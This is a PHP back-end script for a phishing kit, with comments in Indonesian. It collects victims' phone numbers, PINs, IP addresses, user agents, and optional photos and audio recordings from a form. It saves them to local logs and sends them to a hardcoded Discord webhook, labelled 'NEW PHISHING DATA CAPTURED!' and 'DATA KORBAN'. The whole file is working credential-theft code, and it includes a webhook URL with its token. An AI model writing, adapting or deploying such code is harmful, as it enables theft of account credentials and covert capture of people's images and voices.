<?php
// ============ DISCORD WEBHOOK ============
$DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1491936474273419495/QQoiBEDr6mUBPiqo52LiPYGEEPyX9olrZiKd6oRJBjBMe-YcGEODNVTt7KpEbTM14Rzl";
// =========================================

// Ambil data dari form
$phone = $_POST['phone'] ?? '';
$pin = $_POST['pin'] ?? '';
$platform = $_POST['platform'] ?? '';
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$time = date('Y-m-d H:i:s');

// Buat folder uploads jika belum ada
if (!file_exists('uploads')) {
    mkdir('uploads', 0777, true);
}

// 1. SIMPAN KE FILE LOG TEXT
$log = "[$time] $phone | $pin | $platform | $ip | $ua\n";
file_put_contents('logs.txt', $log, FILE_APPEND);

// 2. KIRIM KE DISCORD (PESAN TEXT)
$message = [
    "content" => "@everyone **🎭 NEW PHISHING DATA CAPTURED!**",
    "embeds" => [[
        "title" => "📱 DATA KORBAN",
        "color" => 15158332,
        "fields" => [
            ["name" => "📱 Phone", "value" => "```$phone```", "inline" => false],
            ["name" => "🔑 PIN", "value" => "```$pin```", "inline" => false],
            ["name" => "🎯 Platform", "value" => "```$platform```", "inline" => true],
            ["name" => "🌐 IP", "value" => "```$ip```", "inline" => true],
            ["name" => "🖥️ User Agent", "value" => "```" . substr($ua, 0, 80) . "```", "inline" => false],
            ["name" => "⏰ Time", "value" => "```$time```", "inline" => true]
        ],
        "footer" => ["text" => "LIFX Security System | DIZX😈"],
        "timestamp" => date('c')
    ]]
];

$ch = curl_init($DISCORD_WEBHOOK);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Log hasil kirim ke Discord
$discordLog = "[$time] Discord: HTTP $httpCode - " . ($httpCode == 204 ? "SUCCESS" : "FAILED") . "\n";
file_put_contents('discord_log.txt', $discordLog, FILE_APPEND);

// 3. KIRIM FOTO KE DISCORD (JIKA ADA)
if (isset($_POST['photo']) && !empty($_POST['photo'])) {
    $photoData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $_POST['photo']));
    $photoPath = "uploads/photo_" . time() . "_" . rand(1000,9999) . ".jpg";
    file_put_contents($photoPath, $photoData);
    
    $ch = curl_init($DISCORD_WEBHOOK);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['file' => new CURLFile($photoPath)]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    // Simpan path foto ke log terpisah
    file_put_contents('media_log.txt', "[$time] PHOTO: $photoPath\n", FILE_APPEND);
}

// 4. KIRIM AUDIO KE DISCORD (JIKA ADA)
if (isset($_FILES['audio']) && $_FILES['audio']['error'] == 0) {
    $audioPath = "uploads/audio_" . time() . "_" . rand(1000,9999) . ".webm";
    move_uploaded_file($_FILES['audio']['tmp_name'], $audioPath);
    
    $ch = curl_init($DISCORD_WEBHOOK);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['file' => new CURLFile($audioPath)]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    file_put_contents('media_log.txt', "[$time] AUDIO: $audioPath\n", FILE_APPEND);
}

// 5. RESPONSE KE CLIENT
echo json_encode(["status" => "ok"]);
?>